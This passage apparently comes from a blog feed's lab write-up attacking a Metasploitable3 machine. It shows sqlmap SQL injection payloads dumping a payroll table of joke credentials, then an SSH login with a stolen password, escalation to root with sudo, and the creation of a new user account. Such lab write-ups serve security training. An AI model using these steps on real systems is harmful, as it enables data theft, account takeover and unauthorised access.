+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[12:51:54] [INFO] you can find results of scanning in multiple targets mode inside the CSV file &amp;#39;&lt;/span>/home/parrot/.local/share/sqlmap/output/results-03032024_1250pm.csv&lt;span class="s1">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[12:51:54] [WARNING] your sqlmap version is outdated
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[*] ending @ 12:51:54 /2024-03-03/
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">┌─[parrot@parrot]─[~]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">└──╼ $sqlmap -u http://10.0.2.28/payroll_app.php --forms --dump payroll
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> ___
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> __H__
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> ___ ___[&amp;#34;]_____ ___ ___ {1.7.2#stable}
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">|_ -| . [,] | .&amp;#39;&lt;/span>&lt;span class="p">|&lt;/span> . &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>___&lt;span class="p">|&lt;/span>_ &lt;span class="o">[&lt;/span>&lt;span class="s2">&amp;#34;]_|_|_|__,| _|
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> |_|V... |_| https://sqlmap.org
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&amp;#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[*] starting @ 12:52:58 /2024-03-03/
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[12:52:58] [INFO] testing connection to the target URL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[12:52:58] [INFO] searching for forms
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[1/1] Form:
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">POST http://10.0.2.28/payroll_app.php
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">POST data: user=&amp;amp;password=&amp;amp;s=OK
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">do you want to test this form? [Y/n/q]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;gt; Y
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">Edit POST data [default: user=&amp;amp;password=&amp;amp;s=OK] (Warning: blank fields detected):
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">do you want to fill blank fields with random values? [Y/n] Y
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[12:53:34] [INFO] resuming back-end DBMS &amp;#39;mysql&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[12:53:34] [INFO] using &amp;#39;/home/parrot/.local/share/sqlmap/output/results-03032024_1253pm.csv&amp;#39; as the CSV results file in multiple targets mode
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">sqlmap resumed the following injection point(s) from stored session:
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">---
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">Parameter: user (POST)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> Type: time-based blind
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> Payload: user=CGYY&amp;#39; AND (SELECT 9858 FROM (SELECT(SLEEP(5)))lNho) AND &amp;#39;xRHP&amp;#39;=&amp;#39;xRHP&amp;amp;password=&amp;amp;s=OK
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> Type: UNION query
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> Title: Generic UNION query (NULL) - 4 columns
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> Payload: user=CGYY&amp;#39; UNION ALL SELECT CONCAT(0x717a707a71,0x6f5763664f6a6a4e714e636a4c52676d6f584a5a4f7371786c46504a4b69744c4d4975564474554b,0x71766a7071),NULL,NULL,NULL-- -&amp;amp;password=&amp;amp;s=OK
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">---
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">do you want to exploit this SQL injection? [Y/n] Y
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[12:53:37] [INFO] the back-end DBMS is MySQL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">web server operating system: Linux Ubuntu
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">web application technology: PHP 5.4.5, Apache 2.4.7
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">back-end DBMS: MySQL &amp;gt;= 5.0.12
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[12:53:37] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[12:53:37] [INFO] fetching current database
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[12:53:37] [WARNING] reflective value(s) found and filtering out
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[12:53:37] [INFO] fetching tables for database: &amp;#39;payroll&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[12:53:37] [INFO] fetching columns for table &amp;#39;users&amp;#39; in database &amp;#39;payroll&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[12:53:37] [INFO] fetching entries for table &amp;#39;users&amp;#39; in database &amp;#39;payroll&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">Database: payroll
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">Table: users
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[15 entries]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">+--------+-------------------------+------------------+------------+------------+
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">| salary | password | username | last_name | first_name |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">+--------+-------------------------+------------------+------------+------------+
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">| 9560 | help_me_obiwan | leia_organa | Organa | Leia |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">| 1080 | like_my_father_beforeme | luke_skywalker | Skywalker | Luke |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">| 1200 | nerf_herder | han_solo | Solo | Han |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">| 22222 | b00p_b33p | artoo_detoo | Detoo | Artoo |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">| 3200 | Pr0t0c07 | c_three_pio | Threepio | C |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">| 10000 | thats_no_m00n | ben_kenobi | Kenobi | Ben |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">| 6666 | Dark_syD3 | darth_vader | Vader | Darth |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">| 1025 | but_master:( | anakin_skywalker | Skywalker | Anakin |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">| 2048 | mesah_p@ssw0rd | jarjar_binks | Binks | Jar-Jar |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">| 40000 | @dm1n1str8r | lando_calrissian | Calrissian | Lando |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">| 20000 | mandalorian1 | boba_fett | Fett | Boba |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">| 65000 | my_kinda_skum | jabba_hutt | Hutt | Jaba |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">| 50000 | hanSh0tF1rst | greedo | Rodian | Greedo |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">| 4500 | rwaaaaawr8 | chewbacca | &amp;lt;blank&amp;gt; | Chewbacca |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">| 6667 | Daddy_Issues2 | kylo_ren | Ren | Kylo |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">+--------+-------------------------+------------------+------------+------------+
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[12:53:37] [INFO] table &amp;#39;payroll.users&amp;#39; dumped to CSV file &amp;#39;/home/parrot/.local/share/sqlmap/output/10.0.2.28/dump/payroll/users.csv&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[12:53:37] [INFO] you can find results of scanning in multiple targets mode inside the CSV file &amp;#39;/home/parrot/.local/share/sqlmap/output/results-03032024_1253pm.csv&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[12:53:37] [WARNING] your sqlmap version is outdated
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[*] ending @ 12:53:37 /2024-03-03/
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Connect using SSH. Select a username and password from the lists above&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">┌─&lt;span class="o">[&lt;/span>parrot@parrot&lt;span class="o">]&lt;/span>─&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└──╼ &lt;span class="nv">$ssh&lt;/span> leia_organa@10.0.3.6
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The authenticity of host &lt;span class="s1">&amp;#39;10.0.3.6 (10.0.3.6)&amp;#39;&lt;/span> can&lt;span class="s1">&amp;#39;t be established.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">ED25519 key fingerprint is SHA256:Rpy8shmBT8uIqZeMsZCG6N5gHXDNSWQ0tEgSgF7t/SM.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">This host key is known by the following other names/addresses:
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> ~/.ssh/known_hosts:1: [hashed name]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Warning: Permanently added &amp;#39;&lt;/span>10.0.3.6&lt;span class="s1">&amp;#39; (ED25519) to the list of known hosts.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">leia_organa@10.0.3.6&amp;#39;&lt;/span>s password:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Welcome to Ubuntu 14.04.6 LTS &lt;span class="o">(&lt;/span>GNU/Linux 3.13.0-170-generic x86_64&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Documentation: https://help.ubuntu.com/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">New release &lt;span class="s1">&amp;#39;16.04.7 LTS&amp;#39;&lt;/span> available.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Run &lt;span class="s1">&amp;#39;do-release-upgrade&amp;#39;&lt;/span> to upgrade to it.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The programs included with the Ubuntu system are free software&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">the exact distribution terms &lt;span class="k">for&lt;/span> each program are described in the
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">individual files in /usr/share/doc/*/copyright.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">applicable law.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">leia_organa@metasploitable3-ub1404:~$ uname -a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Linux metasploitable3-ub1404 3.13.0-170-generic &lt;span class="c1">#220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">leia_organa@metasploitable3-ub1404:~$ sudo -s
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>sudo&lt;span class="o">]&lt;/span> password &lt;span class="k">for&lt;/span> leia_organa:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root@metasploitable3-ub1404:~#
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Add new user&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">root@metasploitable3-ub1404:~# adduser abril
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Adding user &lt;span class="sb">`&lt;/span>abril&lt;span class="s1">&amp;#39; ...
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Adding new group `abril&amp;#39;&lt;/span> &lt;span class="o">(&lt;/span>1000&lt;span class="o">)&lt;/span> ...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Adding new user &lt;span class="sb">`&lt;/span>abril&lt;span class="s1">&amp;#39; (1000) with group `abril&amp;#39;&lt;/span> ...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Creating home directory &lt;span class="sb">`&lt;/span>/home/abril&lt;span class="s1">&amp;#39; ...
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Copying files from `/etc/skel&amp;#39;&lt;/span> ...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enter new UNIX password:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Retype new UNIX password:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">passwd: password updated successfully
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Changing the user information &lt;span class="k">for&lt;/span> abril
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enter the new value, or press ENTER &lt;span class="k">for&lt;/span> the default
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Full Name &lt;span class="o">[]&lt;/span>: abril jordan casinillo
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Room Number &lt;span class="o">[]&lt;/span>: &lt;span class="m">47&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Work Phone &lt;span class="o">[]&lt;/span>: &lt;span class="m">123456789&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Home Phone &lt;span class="o">[]&lt;/span>: &lt;span class="m">123456789&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Other &lt;span class="o">[]&lt;/span>: &lt;span class="m">14344&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Is the information correct? &lt;span class="o">[&lt;/span>Y/n&lt;span class="o">]&lt;/span> Y
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root@metasploitable3-ub1404:~# su - abril
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">abril@metasploitable3-ub1404:~$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item></channel></rss>
